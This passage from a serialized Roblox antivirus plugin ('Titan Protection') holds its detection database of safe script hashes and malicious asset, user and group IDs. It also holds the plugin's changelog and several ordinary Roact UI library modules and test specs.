	"7d64b462ea08c1c150496bf3dea15b3b4925b2c9",
	"af81debe99b3dd18a0329396fb7a9f8839838a54",
	"8327550b9c4653b621f22d0ada170669533a2196",-- Venom main script
	"a1ddc0c932cb814fee2fe6fb0bdc140b8b458519",-- Hidden infection scanner
	"340d89d2d84af294e9177b8cb836f535c0cf6bde",-- Known infections table Infection Remover
	"5f00e11b44dc36811f23a6f28f8a4e91d05e72f3",-- Known infections table Infection Remover
	"f964749da3a94dd1f3561534ea7daabe3ec61765",
	"fccda405abd42a076bc40761394cf49e6f8e6d37",
	"17520ae0cdfc91ec1e6c6ace77ee4a65aaa0c5de",
	"dbb7aeb46f04e173cb5f02310994c37de6c7ba86",
	"02ed78fd218da3bb0a0729313ba4694a3b4ddad0",-- Adonis change log
	"06106cf81cd3eb8769ffc59f5e9981a8657d010f",-- Welding script
	"1b770aae7762befc195c99d7f962bee8a609a8c6",-- Adonis Anti exploit client
	"b4a063bb8b474cd175206b4635d57db945102625",-- Adonis Commands module
	"3f6d9be0a483985684b1574339d06666c34e6f16",-- Anti Virus - https://www.roblox.com/library/77495793/AntiVirus-Free
	"9afd0ad5997fc6096e1d7de65c74dbdf06f75a8d",-- LockSmith backdoor scanner module
	"d057a2e20d7806f898eb7dc9dc39f38a0dc688e8",-- LockSmith main
	"25916b919090b719afdf8f8e1d93abebd45deace",-- GameGuard V2
	"a38c655440255629850293bd54151885f9cbdc63",-- Kronos Backdoor Scanner
	"f3a1604bf65eb771be2c0b3f5bfb8ed0fa7a02ce",-- Lord starrks anti virus
	"69b6e8c1250af42432f40354d2c1d9acfc7e96cd",-- Lord starrks Plugin Data
	"7bc8df6748ee1d8ccbf031e5bca3c15f4071c222",-- ACE anti virus
	"4caa4f26c8c32a8ed8734bdb03cb77ae3dff6d9a",-- Script Quarantine - https://www.roblox.com/library/5707182290/Script-Quarantine
	"a9283194820e9ba1f960589a64a1a3be4a59da7f",-- Roblox Default Chat "ChatMain"
	"411c094000106ef4ee9343c14b6135dffe88891d",-- Roblox Default Chat "ChatWindow"
	"0bb97ff040609ce22e9e35172f674d0e9322d81d",-- EISS ChangeLog
	"9eec77535fbe413c67799cfd42f96e932391d2d8",-- EISS Loader
	"1c277e46179cfdbf832d1d063a9c8dd5d655fc4b",-- EISS MainModule
	"6313f98b61a073a3f90a9b3a65a6a159686c60db",-- Avelos Admin loader - Note don't use Avelos Admin / Novus server manager for anti virus or for anti exploit. It contains neither.
	"292b8eb7914ba8ab7cc1ba73f12e16b01f6b4d75",-- Avelos Admin Settings - Note don't use Avelos Admin / Novus server manager for anti virus or for anti exploit. It contains neither.
	"9387f3a7a2bfbdaf3f7964b7f1dc2762abfcd5fc",-- Scriptos archimedes gui module
	"e78e9aa1d683278e87c02035985c8d71579c6a9e",-- Realism mod day and night cycle script
	"b95b31659137f27377c26fdb77a5b71d34f8b0c7",-- Edge align script
	"f7b6c56bf0c5f703d8627cfbf70476eb9bfa661a",-- Gap Fill script
	"1854ac7ba0e3b195e7872135d798630d6dfad017",-- Gap Fill script
	"99989baccc05b222e0dec4a423b11d46448cd4f7",-- Realism mod main script
	"01195109718092dfa7ac65d977c7a234b9f5d88d",-- Multi move script
	"befcb80c8b90b623bcc5c0ab9dd10f4adca68ea6",-- Resize align
	"e21bb5ae30b494696ef07b924a2ac22297c31ff3",-- Resize align
	"b24ece42fe6ea28ba181da0a5b239296ae5e6c6b",-- Adonis client anti
	"8ba40eb6cdb9173d18a61d73127c38278c74a155",-- Adonis server anti
	"569071334d8bc5cef07f9cd53217d00c4ff12b89",-- Adonis commands module server
}


--// A List of safe model ids which the scanner might otherwise detect. \\--

DB.SafeModelIds = {
	2732065843,3239236979,2373501710,359948692,
	3516848054,1868400649,3239236979,5227878809,-- Note don't use Avelos Admin / Novus server manager for anti virus or for anti exploit. It contains neither.
	518094091,512742721,
}


--// A List of safe plugin ids which the scanner might otherwise detect. \\--

DB.SafePluginIds = {
	5121131624,167126759,3499696546,2778962144,
	142273772,5476045255,3550088966,2670956620,
	4917364372,165534573,5363437288,5054344511,
	381046418,142959977,4216304328,164968707,
}


-- // A list of bad groups which upload malicious assets.. \\--

DB.MaliciousGroups = {
	7688235,8970878,8885901,
}


-- // A list of bad users which upload malicious assets. \\--

DB.MaliciousUsers = {
	1002263925,1778676153,1751088619,350082947,
	1833012727,222104580,1738467,688023197,
	1841476885,1841508913,1418091035,1824492836,
	1749134566,1832231975,1038536936,2260459174,
	1774330368,2237418592,1497549110,1497549110,
	1512832628,1469981953,105726832,1244515668,
	1106114479,1070164424,1111131141,521887129,
	1035617150,1341168988,2408917517,
}

--// A List of the known malicious plugin ids \\--

DB.MaliciousPluginsIds = {
	3505516906,3970514733,160457204,
	3979966687,3620029023,3614280305,
	3109259288,2631801555,3511788021,
	2715008764,4018527477,2631594863,
	2661950443,2644964458,2631801555,
	2644964457,2715008764,2672245855,
	3442672940,2644964454,2672245883,
	678183094,419740683,418773926,
	3703353560,3703352523,3703351017,
	3703349786,3703348425,3703346260,
	3702576437,3702575401,3702574362,
	3702468367,3702440544,4546947541,
	4577953821,4577956662,4577972750,
	4577962379,4600011400,4568630998,
	4593798746,4597853145,4598298121,
	4569667445,4602311885,4628794065,
	417843035,415256575,414993280,
	4518886395,4518890979,3702425881,
	414961308,414903118,113364861,
	2672245890,3448124880,3510360729,
	2644964449,2661950467,2661950445,
	2613864560,2661950461,2623611354,
	2634252959,2760053105,2623611352,
	2760053108,2623611348,3664816543,
	2787024683,3622467610,3736586479,
	4503953645,2656826153,3703347385,
	4625982623,4616198606,4593270188,
	4633612096,4634338975,4633518679,
	4628852963,4633534454,4633530934,
	4633200718,4628849504,4668541405,
	4657683663,4633509953,4669754547,
	4674921046,4657772222,4657680834,
	4657680085,4657686498,4657688259,
	4657687313,4686277808,3282101835,
	3610985790,3620916359,3510445485,
	2787024663,2655565054,3664187642,
	3328292627,3745147634,3505506129,
	3633794640,3320045603,3320031385,
	3328279741,3665828829,3390238326,
	2338336838,3442596285,3504329550,
	3976193892,3970465753,3976174426,
	3976195272,3976620715,3976656034,
	3873491088,3873465874,3873455886,
	3873448321,3873428841,3873416714,
	3980010832,3970392013,3901419807,
	3351300478,1198363829,1997381523,
	1119510530,869690527,415001366,
	1198092634,489937255,481912220,
	419847782,419811925,564265857,
	2748528182,4488609078,3397500272,
	4307056497,152153809,1331655594,
	342137348,151643348,878662641,
	146500006,926641903,167776461,
	191804266,1112477793,147593918,
	997531218,4652646115,763983652,
	2516571913,176319945,148950613,
	596379408,163634534,3483627366,
	4289490895,160936671,4439105154,
	1231813337,176319475,308038221,
	4690697777,2995137842,1037757090,
	4702136078,4702156010,4662650784,
	4657771270,4347968267,2531454958,
	4499231340,338338840,4716099159,
	4709361587,4601168640,4523278668,
	4613885366,4669681223,4655911306,
	4633696910,4560358824,4560356232,
	4538623931,4538677941,4534271421,
	4863624219,4864404814,4863366172,
	4880083102,4840245745,4880091950,
	4895471408,4911695732,4840216320,
	4912828815,4906877502,4912091139,
	4840285073,4898923432,4898865604,
	4898878619,4898887674,4898872376,
	4821335776,4910680615,4910338914,
	4821333460,4840189322,4804846446,
	4804812511,4908614373,4836591095,
	4836629250,4840240382,4840224100,
	4840163679,5718315875,4840229959,
	4840203826,4840252644,4840264628,
	4908612183,4919389349,4927307181,
	5168986922,5178525288,5045212184,
	4924745178,4923868340,4915083418,
	4939617069,4928568267,4894275766,
	4936378192,4932813865,4932863914,
	4932985702,4933083314,4932847496,
	4933096162,4941155360,4932069538,
	4915184857,4936514169,4940243760,
	4482353592,4283450281,4256564289,
	4231014616,4670463703,4041585502,
	4025486134,4041588010,4582428104,
	4729364572,4728617712,4728565883,
	3288058696,4732731595,3104443226,
	5238319033,5238194706,5236577579,
	4025488082,4737754167,1198456932,
	2656826137,1290037705,1198079690,
	4742850465,4742479164,4739087546,
	4742480404,4742433843,4744903156,
	4742708820,4741880451,4748072103,
	4977844047,5672762836,4967780035,
	4973200479,4972877968,4990151940,
	4982478536,4958365277,4989287444,
	4936718404,4840580832,4970546106,
	5019575699,4964521519,4856854139,
	659505827,4986626405,4970533346,
	5027682272,4977495041,4958219750,
	5029907851,5015741150,4952829958,
	5056462914,5074555023,5075697531,
	5065586601,5064712799,5075679388,
	5038232215,4912077003,5080927687,
	5080856164,5080831932,5080937295,
	5236497880,5237977152,5237976166,
	5712265461,4840199487,5722873873,
	5077323623,4830142810,4139197388,
	4769994836,4018546695,4830007552,
	4239065681,4830114913,4491619986,
	5238096515,5236505999,5236632984,
	5237917613,5230649809,5217889232,
	4752603939,4830047158,5104803179,
	5109887609,5108497694,5110448949,
	5236503476,4921924503,5183204511,
	5110767026,5110770976,5110772207,
	5110769524,2556480575,4986638865,
	5715181527,5112424591,5096570428,
	4965465362,5075708273,5113479234,
	5197392987,5182699573,5231878111,
	5113492594,5015865410,4937795629,
	5112436389,5112432545,5112442161,
	5236488096,5235450904,5235686274,
	4155099772,3146633195,4880088583,
	4155117338,4975049081,4532147242,
	4744892446,4671121406,5096569040,
	5075619331,5075658749,5096595109,
	5096594269,5096771564,5096569545,
	5096569510,5654151077,5096593123,
	5403343851,5410889588,5407764933,
	5408308240,5422739108,5383736664,
	5096594235,5096594172,5096593191,
	5096594325,5722540246,5723115479,
	5096594241,5096594231,5096593915,
	5096772441,4953292509,5096569489,
	5096577062,5096568629,5096569357,
	5096594308,4986642238,5096594254,
	5096594153,5096569453,5096786434,
	5724055406,5096597911,5096594271,
	5132864684,5429961553,5422357461,
	5096576794,5096593657,5096594442,
	5096577008,5096593547,5096568671,
	5096598275,5096594323,5096594195,
	5096771672,5096594168,5096597904,
	5096771514,5096592968,5096568546,
	5096772437,5096725562,5096599422,
	5403750512,5096594167,5096593407,
	5096630055,5414975959,5385495025,
	5966875140,5967612588,5879252454,
	5096568443,5096568300,5096593616,
	5096569097,5096578249,5096569178,
	5096772028,5096577144,5096568312,
	5096568322,5096772477,5096592850,
	5096594282,5096593092,5096568836,
	5096598015,5096592997,5096594152,
	5410343999,5429661174,5351664164,
	4832621975,5096595082,5096577125,
	5096786535,5096593343,5096594946,
	5096577430,5096592873,5096787531,
	5096577295,5130468231,5149168509,
	5115257344,5122911840,5123201848,
	162333086,4986783068,5123159337,
	2658217401,4693394127,4908888339,
	4830040113,4986649465,4986652848,
	3068834603,4779181340,4861898716,
	4041634577,5722654846,5723264887,
	5722775429,5722907035,5722593656,
	5722949253,5724210249,5722819439,
	5724007355,5723016100,5724134539,
	5724079620,5724278580,5722705373,
	5353634327,3001328804,5272472510,
	4986656560,5654125826,5600686528,
	5562094099,5748052672,5755604315,
	5805271899,5197163142,5606531511,
	5289019192,5755535742,5075686331,
	5647231678,5820976894,5815216891,
	5801408229,5801398057,5854191420,
	5677325089,5843091782,5770454604,
	5606857399,5821576411,5727681596,
	5988685767,5992220373,5992208150,
	5957226629,5977013203,
}

return DB]]></ProtectedString>
				<int64 name="SourceAssetId">-1</int64>
				<BinaryString name="Tags"></BinaryString>
			</Properties>
		</Item>
		<Item class="ModuleScript" referent="RBX1245C0FBE3D1406C8A49B2F961212B26">
			<Properties>
				<BinaryString name="AttributesSerialize"></BinaryString>
				<Content name="LinkedSource"><null></null></Content>
				<string name="Name">CHANGELOG</string>
				<string name="ScriptGuid">{693545B3-88AE-43D5-A14D-A174B59C12A9}</string>
				<ProtectedString name="Source"><![CDATA[--[[
    Titan Protection is an antivirus plugin designed to detect and clean up malicious scripts in a Roblox development enviroment.
    Copyright Â© 2020  Github@ccuser44 (ALE111_boiPNG)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
]]

-- [[Version INSERT INSERT - INSERT]],
return {
	[[Version Beta 0.0.1 - First public beta version releated. Some minor changes and upgrades. Updated SECURITY.md and created CONTRIBUTING.md. Removed all commented detection string from database to shorten file size by half. Optimised database.]],
	[[Version Alpha 0.0.9 - Some lisencing changes. Some minor changes.]],
	[[Version Alpha 0.0.8 - Added binary detection in the require obfuscation detection and some small editions.]],
	[[Version Alpha 0.0.7 - Made malicious users and malicious groups detection list to ease detection.]],
	[[Version Alpha 0.0.6 - Made into rojo and maybe did some other changes.]],
	[[Version Alpha 0.0.5 - Shared alpha testing version. Fixed bugs and changed some enhancements. No UI support I am too lazy.]],
	[[Version Alpha 0.0.4 - Last version before shared alpha testing version released. Fixed & enhanced stuff and added basic UI support.]],
	[[Version Alpha 0.0.3 - Added http integration and plugin scanning as well as some other improvements. Also reworked the debug output mode to make it look simpler.]],
	[[Version Alpha 0.0.2 - Added Persisting asset caching.]],
	[[Version Alpha 0.0.1 - First release of plugin.]],
}
]]></ProtectedString>
				<int64 name="SourceAssetId">-1</int64>
				<BinaryString name="Tags"></BinaryString>
			</Properties>
		</Item>
		<Item class="Folder" referent="RBXCE8FFE8A2506454488EE91997018B9BD">
			<Properties>
				<BinaryString name="AttributesSerialize"></BinaryString>
				<string name="Name">UI</string>
				<int64 name="SourceAssetId">-1</int64>
				<BinaryString name="Tags"></BinaryString>
			</Properties>
		</Item>
	</Item>
	<Item class="Folder" referent="RBX0DE2D89CF75E4B70BAB6E5242425DFC4">
		<Properties>
			<BinaryString name="AttributesSerialize"></BinaryString>
			<string name="Name">Dependancies</string>
			<int64 name="SourceAssetId">-1</int64>
			<BinaryString name="Tags"></BinaryString>
		</Properties>
		<Item class="ModuleScript" referent="RBXB7D0BB8F3C7D4EBF823053B0C28F7982">
			<Properties>
				<BinaryString name="AttributesSerialize"></BinaryString>
				<Content name="LinkedSource"><null></null></Content>
				<string name="Name">Roact</string>
				<string name="ScriptGuid">{544577CF-11F7-42CD-9883-7E86BA7581F9}</string>
				<ProtectedString name="Source"><![CDATA[--[[
	Packages up the internals of Roact and exposes a public API for it.
]]

local GlobalConfig = require(script.GlobalConfig)
local createReconciler = require(script.createReconciler)
local createReconcilerCompat = require(script.createReconcilerCompat)
local RobloxRenderer = require(script.RobloxRenderer)
local strict = require(script.strict)
local Binding = require(script.Binding)

local robloxReconciler = createReconciler(RobloxRenderer)
local reconcilerCompat = createReconcilerCompat(robloxReconciler)

local Roact = strict {
	Component = require(script.Component),
	createElement = require(script.createElement),
	createFragment = require(script.createFragment),
	oneChild = require(script.oneChild),
	PureComponent = require(script.PureComponent),
	None = require(script.None),
	Portal = require(script.Portal),
	createRef = require(script.createRef),
	createBinding = Binding.create,
	joinBindings = Binding.join,
	createContext = require(script.createContext),

	Change = require(script.PropMarkers.Change),
	Children = require(script.PropMarkers.Children),
	Event = require(script.PropMarkers.Event),
	Ref = require(script.PropMarkers.Ref),

	mount = robloxReconciler.mountVirtualTree,
	unmount = robloxReconciler.unmountVirtualTree,
	update = robloxReconciler.updateVirtualTree,

	reify = reconcilerCompat.reify,
	teardown = reconcilerCompat.teardown,
	reconcile = reconcilerCompat.reconcile,

	setGlobalConfig = GlobalConfig.set,

	-- APIs that may change in the future without warning
	UNSTABLE = {
	},
}

return Roact]]></ProtectedString>
				<int64 name="SourceAssetId">-1</int64>
				<BinaryString name="Tags"></BinaryString>
			</Properties>
			<Item class="ModuleScript" referent="RBX230CCC6D8FCF44FD9972C4C0250504D9">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">init.spec</string>
					<string name="ScriptGuid">{2013C767-77C0-48AC-801D-9ADE8A9E6438}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local Roact = require(script.Parent)

	it("should load with all public APIs", function()
		local publicApi = {
			createElement = "function",
			createFragment = "function",
			createRef = "function",
			createBinding = "function",
			joinBindings = "function",
			mount = "function",
			unmount = "function",
			update = "function",
			oneChild = "function",
			setGlobalConfig = "function",
			createContext = "function",

			-- These functions are deprecated and throw warnings!
			reify = "function",
			teardown = "function",
			reconcile = "function",

			Component = true,
			PureComponent = true,
			Portal = true,
			Children = true,
			Event = true,
			Change = true,
			Ref = true,
			None = true,
			UNSTABLE = true,
		}

		expect(Roact).to.be.ok()

		for key, valueType in pairs(publicApi) do
			local success
			if typeof(valueType) == "string" then
				success = typeof(Roact[key]) == valueType
			else
				success = Roact[key] ~= nil
			end

			if not success then
				local existence = typeof(valueType) == "boolean" and "present" or "of type " .. valueType
				local message = (
					"Expected public API member %q to be %s, but instead it was of type %s"
				):format(tostring(key), existence, typeof(Roact[key]))

				error(message)
			end
		end

		for key in pairs(Roact) do
			if publicApi[key] == nil then
				local message = (
					"Found unknown public API key %q!"
				):format(tostring(key))

				error(message)
			end
		end
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXFCAEB63A4FE14B29A2119AAAB66EC22A">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">None</string>
					<string name="ScriptGuid">{03300B1F-6238-4030-819C-7506A99B5F9C}</string>
					<ProtectedString name="Source"><![CDATA[local Symbol = require(script.Parent.Symbol)

-- Marker used to specify that the value is nothing, because nil cannot be
-- stored in tables.
local None = Symbol.named("None")

return None]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXE11D1C4E7EB94A789DB8F7627BA90D8B">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Symbol</string>
					<string name="ScriptGuid">{9CC444E3-EAF2-4FF4-B05D-EE4F2AFA1213}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	A 'Symbol' is an opaque marker type.

	Symbols have the type 'userdata', but when printed to the console, the name
	of the symbol is shown.
]]

local Symbol = {}

--[[
	Creates a Symbol with the given name.

	When printed or coerced to a string, the symbol will turn into the string
	given as its name.
]]
function Symbol.named(name)
	assert(type(name) == "string", "Symbols must be created using a string name!")

	local self = newproxy(true)

	local wrappedName = ("Symbol(%s)"):format(name)

	getmetatable(self).__tostring = function()
		return wrappedName
	end

	return self
end

return Symbol]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXB0785DFFF3F84676852F2A48798E32CA">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createRef</string>
					<string name="ScriptGuid">{A403F1CA-9302-4DCA-842D-D559DF41F5DC}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	A ref is nothing more than a binding with a special field 'current'
	that maps to the getValue method of the binding
]]
local Binding = require(script.Parent.Binding)

local function createRef()
	local binding, _ = Binding.create(nil)

	local ref = {}

	--[[
		A ref is just redirected to a binding via its metatable
	]]
	setmetatable(ref, {
		__index = function(self, key)
			if key == "current" then
				return binding:getValue()
			else
				return binding[key]
			end
		end,
		__newindex = function(self, key, value)
			if key == "current" then
				error("Cannot assign to the 'current' property of refs", 2)
			end

			binding[key] = value
		end,
		__tostring = function(self)
			return ("RoactRef(%s)"):format(tostring(binding:getValue()))
		end,
	})

	return ref
end

return createRef]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXDECB9325BC0F47ECA5A32186E8638193">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">assign</string>
					<string name="ScriptGuid">{7E9AFC81-71C5-4867-8C03-29CD09B5A147}</string>
					<ProtectedString name="Source"><![CDATA[local None = require(script.Parent.None)

--[[
	Merges values from zero or more tables onto a target table. If a value is
	set to None, it will instead be removed from the table.

	This function is identical in functionality to JavaScript's Object.assign.
]]
local function assign(target, ...)
	for index = 1, select("#", ...) do
		local source = select(index, ...)

		if source ~= nil then
			for key, value in pairs(source) do
				if value == None then
					target[key] = nil
				else
					target[key] = value
				end
			end
		end
	end

	return target
end

return assign]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX644E113562864F57B5F06DD27F6DE297">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Type.spec</string>
					<string name="ScriptGuid">{FC3284E1-A0E9-4908-AA38-3B68B9CF962A}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local Type = require(script.Parent.Type)

	describe("of", function()
		it("should return nil if the value is not a table", function()
			expect(Type.of(1)).to.equal(nil)
			expect(Type.of(true)).to.equal(nil)
			expect(Type.of("test")).to.equal(nil)
			expect(Type.of(print)).to.equal(nil)
		end)

		it("should return nil if the table has no type", function()
			expect(Type.of({})).to.equal(nil)
		end)

		it("should return the assigned type", function()
			local test = {
				[Type] = Type.Element
			}

			expect(Type.of(test)).to.equal(Type.Element)
		end)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX27BC069B5A234970A1A5FE73463101BC">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createSpy.spec</string>
					<string name="ScriptGuid">{595932ED-C4C8-4F7E-B1BF-3361D95296BC}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local createSpy = require(script.Parent.createSpy)

	describe("createSpy", function()
		it("should create spies", function()
			local spy = createSpy(function() end)

			expect(spy).to.be.ok()
		end)

		it("should throw if spies are indexed by an invalid key", function()
			local spy = createSpy(function() end)

			expect(function()
				return spy.test
			end).to.throw()
		end)
	end)

	describe("value", function()
		it("should increment callCount when called", function()
			local spy = createSpy(function() end)
			spy.value()

			expect(spy.callCount).to.equal(1)
		end)

		it("should store all values passed", function()
			local spy = createSpy(function() end)
			spy.value(1, true, "3")

			expect(spy.valuesLength).to.equal(3)
			expect(spy.values[1]).to.equal(1)
			expect(spy.values[2]).to.equal(true)
			expect(spy.values[3]).to.equal("3")
		end)

		it("should return the value of the inner function", function()
			local spy = createSpy(function()
				return true
			end)

			expect(spy.value()).to.equal(true)
		end)
	end)

	describe("assertCalledWith", function()
		it("should throw if the number of values differs", function()
			local spy = createSpy(function() end)
			spy.value(1, 2)

			expect(function()
				spy:assertCalledWith(1)
			end).to.throw()
		end)

		it("should throw if any value differs", function()
			local spy = createSpy(function() end)
			spy.value(1, 2)

			expect(function()
				spy:assertCalledWith(1, 3)
			end).to.throw()

			expect(function()
				spy:assertCalledWith(2, 3)
			end).to.throw()
		end)
	end)

	describe("captureValues", function()
		it("should throw if the number of values differs", function()
			local spy = createSpy(function() end)
			spy.value(1, 2)

			expect(function()
				spy:captureValues("a")
			end).to.throw()
		end)

		it("should capture all values in a table", function()
			local spy = createSpy(function() end)
			spy.value(1, 2)

			local captured = spy:captureValues("a", "b")
			expect(captured.a).to.equal(1)
			expect(captured.b).to.equal(2)
		end)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX39730C2B5AB84A339CDBEB0A51783764">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">PureComponent</string>
					<string name="ScriptGuid">{FC0355E0-15AF-4E3D-BF20-61BE2F5C49AA}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	A version of Component with a `shouldUpdate` method that forces the
	resulting component to be pure.
]]

local Component = require(script.Parent.Component)

local PureComponent = Component:extend("PureComponent")

-- When extend()ing a component, you don't get an extend method.
-- This is to promote composition over inheritance.
-- PureComponent is an exception to this rule.
PureComponent.extend = Component.extend

function PureComponent:shouldUpdate(newProps, newState)
	-- In a vast majority of cases, if state updated, something has updated.
	-- We don't bother checking in this case.
	if newState ~= self.state then
		return true
	end

	if newProps == self.props then
		return false
	end

	for key, value in pairs(newProps) do
		if self.props[key] ~= value then
			return true
		end
	end

	for key, value in pairs(self.props) do
		if newProps[key] ~= value then
			return true
		end
	end

	return false
end

return PureComponent]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX6013299EAB0B485896ED328B0360E00E">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">ElementUtils.spec</string>
					<string name="ScriptGuid">{BD637133-4383-41CA-B2D9-924209ABD6B6}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local ElementUtils = require(script.Parent.ElementUtils)
	local createElement = require(script.Parent.createElement)
	local createFragment = require(script.Parent.createFragment)
	local Type = require(script.Parent.Type)

	describe("iterateElements", function()
		it("should iterate once for a single child", function()
			local child = createElement("TextLabel")
			local iterator = ElementUtils.iterateElements(child)
			local iteratedKey, iteratedChild = iterator()
			-- For single elements, the key should be UseParentKey
			expect(iteratedKey).to.equal(ElementUtils.UseParentKey)
			expect(iteratedChild).to.equal(child)

			iteratedKey = iterator()
			expect(iteratedKey).to.equal(nil)
		end)

		it("should iterate over tables", function()
			local children = {
				a = createElement("TextLabel"),
				b = createElement("TextLabel"),
			}

			local seenChildren = {}
			local count = 0

			for key, child in ElementUtils.iterateElements(children) do
				expect(typeof(key)).to.equal("string")
				expect(Type.of(child)).to.equal(Type.Element)
				seenChildren[child] = key
				count = count + 1
			end

			expect(count).to.equal(2)
			expect(seenChildren[children.a]).to.equal("a")
			expect(seenChildren[children.b]).to.equal("b")
		end)

		it("should return a zero-element iterator for booleans", function()
			local booleanIterator = ElementUtils.iterateElements(false)
			expect(booleanIterator()).to.equal(nil)
		end)

		it("should return a zero-element iterator for nil", function()
			local nilIterator = ElementUtils.iterateElements(nil)
			expect(nilIterator()).to.equal(nil)
		end)

		it("should throw if given an illegal value", function()
			expect(function()
				ElementUtils.iterateElements(1)
			end).to.throw()
		end)
	end)

	describe("getElementByKey", function()
		it("should return nil for booleans", function()
			expect(ElementUtils.getElementByKey(true, "test")).to.equal(nil)
		end)

		it("should return nil for nil", function()
			expect(ElementUtils.getElementByKey(nil, "test")).to.equal(nil)
		end)

		describe("single elements", function()
			local element = createElement("TextLabel")

			it("should return the element if the key is UseParentKey", function()
				expect(ElementUtils.getElementByKey(element, ElementUtils.UseParentKey)).to.equal(element)
			end)

			it("should return nil if the key is not UseParentKey", function()
				expect(ElementUtils.getElementByKey(element, "test")).to.equal(nil)
			end)
		end)

		it("should return the corresponding element from a table", function()
			local children = {
				a = createElement("TextLabel"),
				b = createElement("TextLabel"),
			}

			expect(ElementUtils.getElementByKey(children, "a")).to.equal(children.a)
			expect(ElementUtils.getElementByKey(children, "b")).to.equal(children.b)
		end)

		it("should return nil if the key does not exist", function()
			local children = createFragment({})

			expect(ElementUtils.getElementByKey(children, "a")).to.equal(nil)
		end)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX7F9900D32E854FE58402ED96D359ADA0">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">invalidSetStateMessages</string>
					<string name="ScriptGuid">{91366419-17C3-45FC-8746-AC7DD29C9E06}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	These messages are used by Component to help users diagnose when they're
	calling setState in inappropriate places.

	The indentation may seem odd, but it's necessary to avoid introducing extra
	whitespace into the error messages themselves.
]]
local ComponentLifecyclePhase = require(script.Parent.ComponentLifecyclePhase)

local invalidSetStateMessages = {}

invalidSetStateMessages[ComponentLifecyclePhase.WillUpdate] = [[
setState cannot be used in the willUpdate lifecycle method.
Consider using the didUpdate method instead, or using getDerivedStateFromProps.

Check the definition of willUpdate in the component %q.]]

invalidSetStateMessages[ComponentLifecyclePhase.WillUnmount] = [[
setState cannot be used in the willUnmount lifecycle method.
A component that is being unmounted cannot be updated!

Check the definition of willUnmount in the component %q.]]

invalidSetStateMessages[ComponentLifecyclePhase.ShouldUpdate] = [[
setState cannot be used in the shouldUpdate lifecycle method.
shouldUpdate must be a pure function that only depends on props and state.

Check the definition of shouldUpdate in the component %q.]]

invalidSetStateMessages[ComponentLifecyclePhase.Render] = [[
setState cannot be used in the render method.
render must be a pure function that only depends on props and state.

Check the definition of render in the component %q.]]

invalidSetStateMessages["default"] = [[
setState can not be used in the current situation, because Roact doesn't know
which part of the lifecycle this component is in.

This is a bug in Roact.
It was triggered by the component %q.
]]

return invalidSetStateMessages]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX5B360606D7E7455C9474B80618422FB1">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">GlobalConfig</string>
					<string name="ScriptGuid">{1E7FA384-F97F-41E2-B9D3-0C15169A813E}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	Exposes a single instance of a configuration as Roact's GlobalConfig.
]]

